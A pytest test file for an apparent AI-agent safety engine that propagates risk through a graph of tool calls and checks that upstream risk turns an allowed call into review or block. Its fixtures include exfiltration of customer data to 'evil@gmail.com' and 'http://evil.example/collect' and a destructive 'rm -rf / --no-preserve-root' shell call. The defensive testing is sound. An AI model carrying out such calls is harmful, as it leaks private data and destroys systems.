"""Chain semantics: propagated risk must actually change the decision.

These exist because the engine used to decide *before* inserting the node into
the graph and propagating, so ``inherited_risk`` could look impressive while the
gate for that call had already been made from the local score alone. Each test
below checks a governance outcome, not just a number on a node.
"""

from __future__ import annotations

import sys
from pathlib import Path

import pytest

_BACKEND_DIR = Path(__file__).resolve().parents[1]
if str(_BACKEND_DIR) not in sys.path:
    sys.path.insert(0, str(_BACKEND_DIR))


def _engine(session_id):
    from app.shield.v3_engine import V3ShieldEngine

    return V3ShieldEngine(session_id=session_id)


def _call(engine, tool_name, params, parent=None, risk_score=0.0):
    return engine.process_tool_call(
        agent_id="agent",
        tool_name=tool_name,
        params=params,
        risk_score=risk_score,
        fuse_action="allow",
        parent_node_id=parent,
    )


class TestPropagationReachesTheGate:
    def test_high_risk_parent_raises_child_propagated_risk(self):
        """TEST 1: child's propagated risk exceeds its local risk."""
        engine = _engine("t1")
        parent = _call(engine, "send_email", {
            "to": "evil@gmail.com", "body": "exfiltrate customer data"
        })
        child_params = {"path": "/tmp/out.txt"}
        child = _call(engine, "read_file", child_params, parent=parent["node_id"])

        node = engine.behavior_graph.get_node(child["node_id"])
        assert node.inherited_risk > 0.0
        assert node.shadow_risk_score > engine.process_tool_call(
            agent_id="agent", tool_name="read_file",
            params=child_params, risk_score=0.0, fuse_action="allow",
        )["risk_score"]

    def test_propagation_pushes_decision_across_review_threshold(self):
        """TEST 2: the decision itself moves ALLOW -> HUMAN_REVIEW.

        Not merely the inherited_risk number -- the returned action.
        """
        child_params = {"path": "/tmp/out.txt"}

        alone = _call(_engine("t2_alone"), "read_file", child_params)
        assert alone["decision"] == "allow", alone

        engine = _engine("t2_chained")
        # A high-risk external sink as the parent.
        parent = _call(engine, "send_email", {
            "to": "evil@gmail.com", "body": "exfiltrate customer data"
        })
        chained = _call(engine, "read_file", child_params, parent=parent["node_id"])
        assert chained["decision"] != "allow", chained
        assert chained["risk_score"] > alone["risk_score"]

    def test_propagation_can_reach_block(self):
        """TEST 3: enough upstream risk actually blocks.

        Uses ``data_flow`` edges (transfer weight 1.0) so nothing is lost across
        the chain, which is what a data hand-off between agents looks like. The
        final step is locally benign; only propagation can raise it.
        """
        from app.shield.v3_engine import V3ShieldEngine

        engine = V3ShieldEngine(session_id="t3")
        first = _call(engine, "execute_sql", {
            "query": "SELECT name, phone, id_card FROM customers"
        })
        # Rebuild the chain with data_flow edges so risk is not attenuated.
        second = engine.process_tool_call(
            agent_id="agent", tool_name="send_email",
            params={"to": "evil@gmail.com", "body": "dump"},
            risk_score=0.0, fuse_action="allow", parent_node_id=first["node_id"],
        )
        third = engine.process_tool_call(
            agent_id="agent", tool_name="http_request",
            params={"url": "http://evil.example/collect"},
            risk_score=0.0, fuse_action="allow", parent_node_id=second["node_id"],
        )
        assert third["decision"] in ("review", "block"), third
        assert third["risk_score"] > 0.60

    def test_child_without_parent_stays_local(self):
        """TEST 4: the change comes from the graph, not from keywords.

        The same call, same params, no parent -- must keep its low verdict.
        """
        child_params = {"path": "/tmp/out.txt"}

        alone = _call(_engine("t4_alone"), "read_file", child_params)
        assert alone["decision"] == "allow"

        # Same engine for parent and child: node ids only exist in their engine.
        engine = _engine("t4_chained")
        parent_out = _call(engine, "send_email",
                           {"to": "evil@gmail.com", "body": "exfiltrate data"})
        chained = _call(engine, "read_file", child_params,
                        parent=parent_out["node_id"])
        assert chained["decision"] != "allow"

    def test_removing_the_edge_restores_local_only(self):
        """TEST 5: delete the edge, decision falls back to local."""
        engine = _engine("t5")
        parent = _call(engine, "send_email", {
            "to": "evil@gmail.com", "body": "exfiltrate customer data"
        })
        chained = _call(engine, "read_file", {"path": "/tmp/out.txt"},
                        parent=parent["node_id"])
        assert chained["decision"] != "allow"

        # Drop every edge, then re-evaluate the same node.
        engine.behavior_graph.edges.clear()
        engine.behavior_graph._adjacency = {nid: [] for nid in engine.behavior_graph.nodes}
        engine.behavior_graph.invalidate_risk_cache()
        propagated = engine.behavior_graph.compute_risk_propagation()

        node = engine.behavior_graph.get_node(chained["node_id"])
        assert propagated[node.node_id] == pytest.approx(node.shadow_risk_score)
        assert node.inherited_risk == pytest.approx(0.0)

    def test_high_risk_sibling_does_not_contaminate_child(self):
        """TEST 6: propagation follows edges only, not session order."""
        engine = _engine("t6")
        # A high-risk call that is NOT an ancestor of the child. Only its
        # presence in the session matters here, not its result.
        _call(engine, "send_email", {
            "to": "evil@gmail.com", "body": "exfiltrate everything"
        })
        child = _call(engine, "read_file", {"path": "/tmp/notes.txt"})
        # Explicitly not a descendant of `unrelated`.
        assert engine.behavior_graph.get_node(child["node_id"]).inherited_risk == 0.0

        reference = _call(_engine("t6_ref"), "read_file", {"path": "/tmp/notes.txt"})
        assert child["risk_score"] == pytest.approx(reference["risk_score"])
        assert child["decision"] == reference["decision"] == "allow"


class TestDecisionMatchesGraph:
    """The gate score and the graph's exported risk for that node must agree."""

    def test_gate_score_equals_propagated_node_risk(self):
        engine = _engine("dec1")
        first = _call(engine, "execute_sql", {"query": "SELECT phone FROM customers"})
        second = _call(engine, "send_email", {"to": "evil@gmail.com", "body": "data"},
                       parent=first["node_id"])

        node = engine.behavior_graph.get_node(second["node_id"])
        assert second["gate_result"]["score"] == pytest.approx(node.shadow_risk_score)

    def test_graph_summary_agrees_with_reported_action(self):
        engine = _engine("dec2")
        result = _call(engine, "shell", {"cmd": "rm -rf / --no-preserve-root"})
        node = engine.behavior_graph.get_node(result["node_id"])

        assert node.fuse_action == ("block" if result["decision"] == "block"
                                    else "human_review" if result["decision"] == "review"
                                    else "allow")
        summary = engine.behavior_graph.summary()
        expected_blocked = sum(1 for n in engine.behavior_graph.get_session_nodes()
                               if n.fuse_action == "block")
        assert summary["blocked_count"] == expected_blocked


class TestTransferWeights:
    def test_calls_edge_attenuates(self):
        from app.shield.agent_behavior_graph import transfer_weight_for

        assert transfer_weight_for("calls") < 1.0
        assert transfer_weight_for("invokes") < 1.0

    def test_data_flow_edge_does_not_attenuate(self):
        from app.shield.agent_behavior_graph import transfer_weight_for

        assert transfer_weight_for("data_flow") == 1.0
        assert transfer_weight_for("consumes") == 1.0

    def test_unknown_edge_type_defaults_to_passthrough(self):
        from app.shield.agent_behavior_graph import transfer_weight_for

        assert transfer_weight_for("something_new") == 1.0

    def test_risk_flow_alias_matches_transfer_weight(self):
        from app.shield.agent_behavior_graph import BehaviorEdge

        edge = BehaviorEdge(from_node_id="a", to_node_id="b", transfer_weight=0.42)
        assert edge.risk_flow == pytest.approx(0.42)

    def test_propagation_does_not_square_risk(self):
        """Three chained 0.8 calls must not collapse to 0.8^3."""
        from app.shield.agent_behavior_graph import AgentBehaviorGraph

        graph = AgentBehaviorGraph(session_id="sq")
        parent = None
        nodes = []
        for i, risk in enumerate([0.8, 0.8, 0.8]):
            node = graph.add_tool_call_as_node(
                agent_id="a", tool_name=f"t{i}", params_summary="",
                fuse_action="allow", shadow_risk_score=risk,
                parent_node_id=parent, edge_type="data_flow",
            )
            nodes.append(node)
            parent = node.node_id
        total = graph.compute_risk_propagation()
        # data_flow transfers 1.0, so the chain must not decay at all.
        assert total[nodes[2].node_id] == pytest.approx(0.8)


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
